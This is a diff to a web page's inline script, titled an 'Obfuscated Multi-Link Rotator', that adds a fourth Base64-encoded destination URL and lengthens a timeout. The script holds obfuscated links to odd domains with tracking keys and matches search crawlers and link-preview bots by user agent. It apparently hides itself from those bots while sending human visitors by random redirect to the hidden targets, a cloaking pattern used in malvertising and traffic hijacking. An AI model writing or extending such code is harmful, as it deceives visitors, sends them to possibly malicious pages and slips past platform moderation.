@@ -99,14 +99,16 @@
     <!-- Universal Cross-Browser Obfuscated Multi-Link Rotator Script -->
     <script>
         (function() {
-            // Array of Obfuscated (Base64) destination links for 33% / 33% / 33% random rotation
+            // Array of Obfuscated (Base64) destination links for 25% equal random rotation
             var _links = [
                 // Link 1: https://evidentbummerhike.com/haa3hxjq0g?key=ac1f717ba17a321ce5b3b6d7a3a015e7
                 "aHR0cHM6Ly9ldmlkZW50YnVtbWVyaGlrZS5jb20vaGFhM2h4anEwZz9rZXk9YWMxZjcxN2JhMTdhMzIxY2U1YjNiNmQ3YTNhMDE1ZTc=",
                 // Link 2: https://evidentbummerhike.com/rsu92i46x7?key=b3c572c38c30c2e57035b070c0d75b27
                 "aHR0cHM6Ly9ldmlkZW50YnVtbWVyaGlrZS5jb20vcnN1OTJpNDZ4Nz9rZXk9YjNjNTcyYzM4YzMwYzJlNTcwMzViMDcwYzBkNzViMjc=",
                 // Link 3: https://parasiteoutdoorsmix.com/haa3hxjq0g?key=ac1f717ba17a321ce5b3b6d7a3a015e7
-                "aHR0cHM6Ly9wYXJhc2l0ZW91dGRvb3JzbWl4LmNvbS9oYWEzaHhqcTBnP2tleT1hYzFmNzE3YmExN2EzMjFjZTViM2I2ZDdhM2EwMTVlNw=="
+                "aHR0cHM6Ly9wYXJhc2l0ZW91dGRvb3JzbWl4LmNvbS9oYWEzaHhqcTBnP2tleT1hYzFmNzE3YmExN2EzMjFjZTViM2I2ZDdhM2EwMTVlNw==",
+                // Link 4: https://parasiteoutdoorsmix.com/rsu92i46x7?key=b3c572c38c30c2e57035b070c0d75b27
+                "aHR0cHM6Ly9wYXJhc2l0ZW91dGRvb3JzbWl4LmNvbS9yc3U5Mmk0Nng3P2tleT1iM2M1NzJjMzhjMzBjMmU1NzAzNWIwNzBjMGQ3NWIyNw=="
             ];
 
             var botPattern = /bot|crawler|spider|facebookexternalhit|facebot|googlebot|bingbot|whatsapp|telegrambot|twitterbot|linkedinbot|slackbot|discordbot|applebot|yandex|duckduckbot/i;
@@ -175,7 +177,7 @@
                             document.location = target;
                         }
                     }
-                }, 0);
+                }, 100);
             }
 
             if (document.readyState === "loading") {
